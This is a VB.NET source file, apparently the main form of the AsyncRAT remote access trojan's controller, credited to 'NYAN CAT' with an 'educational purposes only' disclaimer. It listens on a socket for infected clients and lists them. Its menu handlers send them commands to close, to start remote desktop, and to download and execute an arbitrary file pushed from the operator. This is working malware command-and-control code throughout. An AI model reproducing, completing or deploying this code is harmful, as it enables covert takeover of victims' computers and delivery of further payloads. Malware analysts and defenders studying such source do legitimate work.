Imports System.ComponentModel
Imports System.IO

'

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

'

Public Class Form1
    Public S As New ServerSocket

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Messages.F = Me

        Try
            S.Start(Settings.PORT)
            AddHandler Client.Read, AddressOf Messages.Read
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub

    Private Async Sub CloseClientToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseClientToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try


                Dim M As New MemoryStream
                Dim S As Byte() = SB("CLOSE")
                Await M.WriteAsync(S, 0, S.Length)
                Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)

                For Each C As ListViewItem In LV1.SelectedItems
                    Dim x As Client = CType(C.Tag, Client)
                    Try
                        x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
                    Catch ex As Exception
                        x.isDisconnected()
                    End Try
                Next

                Try
                    Await M.FlushAsync()
                    M.Dispose()
                Catch ex As Exception
                End Try

            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Async Sub DownloadAndExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadAndExecuteToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.*)|*.*"
                    .Title = "Download and Execute"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim M As New MemoryStream
                    Dim S As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
                    Await M.WriteAsync(S, 0, S.Length)
                    Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)

                    For Each C As ListViewItem In LV1.SelectedItems
                        Dim x As Client = CType(C.Tag, Client)

                        Try
                            x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
                        Catch ex As Exception
                            x.isDisconnected()
                        End Try
                    Next

                    Try
                        Await M.FlushAsync()
                        M.Dispose()
                    Catch ex As Exception
                    End Try

                End If
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Async Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try


                Dim M As New MemoryStream
                Dim S As Byte() = SB("RD-")
                Await M.WriteAsync(S, 0, S.Length)
                Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)

                For Each C As ListViewItem In LV1.SelectedItems
                    Dim x As Client = CType(C.Tag, Client)
                    Try
                        x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
                    Catch ex As Exception
                        x.isDisconnected()
                    End Try
                Next

                Try
                    Await M.FlushAsync()
                    M.Dispose()
                Catch ex As Exception
                End Try

            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
        Try

            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString)
            Me.Text = "AsyncRAT  // NYAN CAT  // " + DateTime.Now

        Catch ex As Exception
        End Try
    End Sub

    Private Async Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
        If LV1.Items.Count > 0 Then
            Try

                Dim M As New MemoryStream
                Dim S As Byte() = SB("PING!")
                Await M.WriteAsync(S, 0, S.Length)
                Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)

                For Each C As ListViewItem In LV1.SelectedItems
                    Dim x As Client = CType(C.Tag, Client)
                    Try
                        x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
                    Catch ex As Exception
                        x.isDisconnected()
                    End Try
                Next

                Try
                    Await M.FlushAsync()
                    M.Dispose()
                Catch ex As Exception
                End Try

            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            Environment.Exit(0)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub LV1_MouseMove(sender As Object, e As MouseEventArgs) Handles LV1.MouseMove
        Try
            Dim hitInfo = LV1.HitTest(e.Location)
            If e.Button = MouseButtons.Left AndAlso (hitInfo.Item IsNot Nothing OrElse hitInfo.SubItem IsNot Nothing) Then LV1.Items(hitInfo.Item.Index).Selected = True
        Catch ex As Exception
        End Try
    End Sub


    'Private mouseDownLV1 As Boolean
    'Private Sub LV1_MouseDown(sender As Object, e As MouseEventArgs) Handles LV1.MouseDown
    '    mouseDownLV1 = True
    'End Sub

    'Private Sub LV1_MouseMove(sender As Object, e As MouseEventArgs) Handles LV1.MouseMove
    '    If mouseDownLV1 Then
    '        Try
    '            LV1.Items(LV1.HitTest(e.Location).Item.Index).Selected = True
    '        Catch : End Try
    '    End If
    'End Sub

    'Private Sub LV1_MouseUp(sender As Object, e As MouseEventArgs) Handles LV1.MouseUp
    '    mouseDownLV1 = False
    'End Sub

End Class
